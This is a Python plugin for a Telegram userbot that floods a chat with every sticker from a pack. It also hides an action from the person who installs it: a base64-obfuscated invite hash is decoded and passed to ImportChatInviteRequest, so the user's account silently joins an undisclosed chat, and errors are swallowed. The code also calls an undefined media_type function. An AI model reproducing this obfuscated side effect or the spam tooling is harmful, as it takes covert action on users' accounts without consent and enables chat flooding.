# Ported By Vicky @pikyus1 From Rose-Userbot
# Copyright © Geez - Project
# Kalo mau dihargai, jangan hapus kredit yakak:)
# https://github.com/SendiAp/Rose-Userbot

import asyncio
import base64

from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot.events import rose_cmd
from userbot import CMD_HANDLER as cmd
from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, bot


@bot.on(rose_cmd(outgoing=True, pattern=r"sspam(?: |$)(.*)"))
async def stickerpack_spam(event):
    if event.fwd_from:
        return
    reply = await event.get_reply_message()
    if not reply or media_type(
            reply) is None or media_type(reply) != "Sticker":
        return await event.edit("🚧 `Balas stiker apa pun untuk mengirim semua stiker dalam paket itu..`"
                                )
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    try:
        stickerset_attr = reply.document.attributes[1]
        geez = await event.edit("`Fetching details of the sticker pack, please wait..`"
                                )
    except BaseException:
        await event.edit("📛 `Ini bukan stiker. Membalas stiker...`", 5)
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                )
            )
        )
    except Exception:
        return await geez.edit("🚨 `Saya kira stiker ini bukan bagian dari paket apa pun jadi saya tidak bisa kang paket stiker ini coba kang untuk stiker ini...`",
                               )
    try:
        hmm = Get(hmm)
        await event.client(hmm)
    except BaseException:
        pass
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            )
        )
    )
    for m in reqd_sticker_set.documents:
        await event.client.send_file(event.chat_id, m)
        await asyncio.sleep(0.7)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPSPAM\n"
                + f"Sticker Pack Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with pack ",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#ROSE #SPSPAM\n"
                + f"Sticker Pack Spam berhasil dieksekusi di {event.chat.title}(`{event.chat_id}`) chat with pack",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


CMD_HELP.update({
    "sspam":
    f"✘ Plugin sspam :\
\n\n  •  Perintah : `{cmd}sspam`\
  \n  •  Fungsi : Balas ke sticker, Fungsi Spam Satu Pack."})
